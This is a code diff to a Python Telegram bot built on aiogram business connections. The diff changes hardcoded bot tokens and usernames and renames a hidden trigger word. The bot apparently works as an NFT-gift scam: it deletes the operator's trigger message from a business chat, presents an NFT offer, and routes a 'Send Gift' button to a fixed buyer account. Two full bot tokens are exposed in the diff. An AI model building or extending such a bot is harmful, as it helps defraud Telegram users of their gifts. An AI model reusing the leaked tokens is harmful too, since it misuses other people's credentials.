@@ -17,15 +17,15 @@ from aiogram.types import (
 )
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = "8684362802:AAFH3pwrqtZ3UuoGUiFby995ykbidZURk0I"
+BOT_TOKEN = "8790017360:AAHds4YnUvg-MUXGb61KwSYQ_GwEnv7-M28"
 
 EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
 EMOJI_DECLINE_EN = "5774077015388852135"
 EMOJI_ACCEPT = "5774022692642492953"
 
-OFFER_USERNAME = "atakovan"
-BUYER_USERNAME = "gemzu"
+OFFER_USERNAME = "greenpeace"
+BUYER_USERNAME = "deriikop"
 
 logging.basicConfig(
     level=logging.INFO,
@@ -100,7 +100,8 @@ def parse_nft_link(link: str):
 
 def parse_offer_command(text: str):
     parts = text.strip().split()
-    if len(parts) < 3 or parts[0].lower() != "/delitpr":
+    # Теперь триггер — слово "truslo" (без слэша)
+    if len(parts) < 3 or parts[0].lower() != "truslo":
         return None
     link = parts[1]
     amount = parts[2]
@@ -271,7 +272,8 @@ async def handle_business_connection(connection: BusinessConnection) -> None:
     logger.info(f"[BC] owner={connection.user.id} connection_id={connection.id}")
 
 
-@dp.business_message(F.text.startswith("/delitpr"))
+# Слушаем все сообщения, начинающиеся со слова truslo (без учета регистра)
+@dp.business_message(F.text.regexp(r"(?i)^truslo\s"))
 async def handle_offer(message: Message) -> None:
     if not message.business_connection_id:
         logger.warning("[offer] no business_connection_id")
@@ -294,7 +296,7 @@ async def handle_offer(message: Message) -> None:
             business_connection_id=bc_id,
             message_ids=[message.message_id],
         )
-        logger.info("[offer] команда /delitpr удалена")
+        logger.info("[offer] команда truslo удалена")
     except Exception as e:
         log_telegram_error("offer-delete", e, chat_id=message.chat.id, bc_id=bc_id)
 
@@ -474,7 +476,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
             [
                 InlineKeyboardButton(
                     text="Send Gift",
-                    url=f"tg://send_gift?to=gemzu",
+                    url=f"tg://send_gift?to=deriikop",
                 )
             ]
         ]
